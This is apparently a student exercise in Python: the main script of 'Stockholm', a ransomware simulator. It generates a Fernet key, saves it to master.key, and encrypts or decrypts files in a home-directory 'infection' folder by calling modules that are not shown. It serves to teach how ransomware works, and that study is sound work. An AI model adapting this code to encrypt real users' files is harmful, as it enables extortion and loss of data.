#!/usr/bin/python3

# **************************************************************************** #
#                                                                              #
#                                                         :::      ::::::::    #
#    stockholm.py                                       :+:      :+:    :+:    #
#                                                     +:+ +:+         +:+      #
#    By: sleleu <sleleu@student.42.fr>              +#+  +:+       +#+         #
#                                                 +#+#+#+#+#+   +#+            #
#    Created: 2023/09/22 17:41:44 by sleleu            #+#    #+#              #
#    Updated: 2023/09/22 17:41:46 by sleleu           ###   ########.fr        #
#                                                                              #
# **************************************************************************** #

import os, argparse
from cryptography.fernet import Fernet
from encryption import encryption
from decryption import decryption

LIGHT_PURPLE = "\033[1;35m"
END = "\033[0m"

ascii_header = """
   ______           __    __        __    
  / __/ /____  ____/ /__ / /  ___  / /_ _ 
 _\ \/ __/ _ \/ __/  '_// _ \/ _ \/ /  ' \\
/___/\__/\___/\__/_/\_\/_//_/\___/_/_/_/_/
            Created by : https://github.com/Sleleu                              
"""
# Font infos : SmSlant by Glenn Chappell 6/93 - based on Small & Slant

def parse_arguments():
    desc = "Stockholm is a Python script designed for testing and \
        gaining a better understanding of how ransomware functions. \
        It encrypts data using the Fernet encryption method and appends \
        the '.ft' extension to all files within the specified folder. This \
        program exclusively operates within a folder named 'infection' located \
        in the user's HOME directory and only encrypts files whose extensions have \
        been targeted by Wannacry."
    parser = argparse.ArgumentParser(description=desc)
    parser.add_argument("-v", "--version", action="store_true", help="show the version of the program.")
    parser.add_argument("-r", "--reverse", nargs=1, metavar="<KEY>", help="reverse the infection with the <KEY> entered as argument")
    parser.add_argument("-s", "--silent", action="store_true", help="the program will not produce any output")
    return parser.parse_args()

def store_key(key: bytes) -> None:
    if os.path.exists("master.key"):
        print("Stockholm.py: file 'master.key' already exist. Be careful not to override/delete the previous key before decryption.\n\
              If you are certain of what you're doing, delete the previous master.key file beforehand.")
        exit(1)
    try:
        with open("master.key", "wb") as file:
            file.write(key)
    except OSError as error:
        print(error)
        exit(1)

def get_home()-> str:
    home: str = os.path.expanduser("~")
    try:
        assert home is not None, "stockholm.py: error: $HOME environnement variable is not defined"
        assert os.path.isdir(home) is not False, "stockholm.py: error: $HOME environnement variable is incorrect"
    except AssertionError as error:
        print(error)
        exit(1)
    return home

def get_path(home: str)-> str:
    path: str = os.path.join(home, "infection")
    try:
        assert os.path.isdir(path) is not False, "stockholm.py: error: infection folder does not exist"
    except AssertionError as error:
        print(error)
        exit(1)
    return path

if __name__ == "__main__":
    args = parse_arguments()
    if args.version:
        print(f"{LIGHT_PURPLE}Stockholm 1.0.1{END}")
        exit(0)
    if args.silent is False:
        print(f"{LIGHT_PURPLE}{ascii_header}{END}")
    home: str = get_home()
    path: str = get_path(home)
    silent: bool = args.silent
    if args.reverse:
        key_file = args.reverse[0]
        decryption(key_file, path, silent)
    else:
        key: bytes = Fernet.generate_key()
        store_key(key)
        try:
            fernet = Fernet(key)
        except ValueError as error:
            print(error)
            exit(1)
        encryption(fernet, path, silent)